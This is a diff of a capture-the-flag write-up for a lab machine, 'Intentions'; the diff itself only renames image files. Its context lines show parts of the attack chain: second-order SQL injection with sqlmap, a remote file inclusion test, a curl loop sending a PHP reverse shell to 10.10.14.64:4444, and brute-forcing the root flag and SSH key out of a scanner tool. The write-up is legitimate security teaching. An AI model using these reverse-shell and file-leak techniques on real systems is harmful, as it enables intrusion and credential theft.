@@ -21,7 +21,7 @@ We don't need to add any domains for this machine. Since only port 80 is open, w
 
 Port 80 reveals a basic login page:
 
-<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40) (6).png" alt=""><figcaption></figcaption></figure>
 
 The HTTP requests sent when visiting this page are rather interesting:
 
@@ -46,15 +46,15 @@ So there are some forms of `base64` encoded cookies involved in this website. An
 
 When we login, there is an extra cookie called `token` that is being assigned. It's a JWT token with this value:
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Again, not sure what to do with this yet. We can click on the 'Gallery' option to see the traffic generated:
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
 
 From the looks of it, it seems that the backend uses some kind of SQL database based on the data returned. When we view our 'Profile', we can see that there is an option to update it with our favourite genres:
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
 
 This sends this POST request to the backend:
 
@@ -133,7 +133,7 @@ The only point of weakness seems to be that 'Genre' updating feature, so I went 
 
 To resolve this, I used the `--tamper=space2plus` flag. While the `sqlmap` ran, I checked the other parts of the website. If we attempt to view the `/feed`, there is a weird error response captured:
 
-<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 This normally didn't happen because requests to this would return images with their IDs. This highlights that the injection results might only be viewable when we send a request here instead, thus making the website potentially vulnerable to 2nd order SQL Injection:
 
@@ -231,11 +231,11 @@ $ sqlmap -r req --tamper=space2comment --batch --second-req req2 -D intentions -
 
 `greg` and `steve` are both the administrators of the website, and we have their Bcrypt hashes. I used the same method to login for the v1 API, which involved sending a POST request to `/api/v1/auth/login`, and it responds as I expected:
 
-<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (52) (2).png" alt=""><figcaption></figcaption></figure>
 
 Sending the correct parameters resulted in a successful login as `greg`, which generates a valid token.
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23) (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Admin API --> RCE
 
@@ -249,11 +249,11 @@ The link brings us to the PHP page for Imagick:
 
 Going to "Images" reveals that we can edit them:
 
-<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can edit the images using 4 different effects:
 
-<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (46) (8).png" alt=""><figcaption></figcaption></figure>
 
 This would send a POST request to the v2 API:
 
@@ -290,7 +290,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 {"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.&#x20;
 
@@ -356,13 +356,13 @@ $ while true; do curl -G --data-urlencode 'a=$sock=fsockopen("10.10.14.64",4444)
 
 Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (41) (3).png" alt=""><figcaption></figcaption></figure>
 
 When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!&#x20;
 
 <figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -445,7 +445,7 @@ wget <IP>:4444/rep.tar
 
 Afterwards, we can view the `git log -p -2` output to find some credentials.
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then `su` to `greg`.
 
@@ -529,7 +529,7 @@ greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
 
 The resultant hash is crackable on CrackStation to give the first character of the flag:
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can slowly brute force the `root` flag out character by character. The user flag was 33 characters, so this should be the same. I took the script from my RainyDay writeup and modified it a bit:
 
@@ -627,7 +627,7 @@ for h in hashes:
             break
 ```
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33) (8).png" alt=""><figcaption></figcaption></figure>
 
 This would eventually get the correct hash out for us to submit.
 
@@ -650,7 +650,7 @@ We can then transfer this to our machine via hosting the `output.txt` file on a 
 $ cat sshkey.txt | awk '{print "\"" $5 "\"\,"}' > hashes.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (5).png" alt=""><figcaption></figcaption></figure>
 
 Just put this within a list like `hashes = [ <all the hashes> ]`. Afterwards, `sshkey.py` can be used to brute force the SSH key:
 
@@ -678,6 +678,6 @@ for h in hashes:
 
 Then, just use this to `ssh` in as `root`:
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25) (4).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!&#x20;
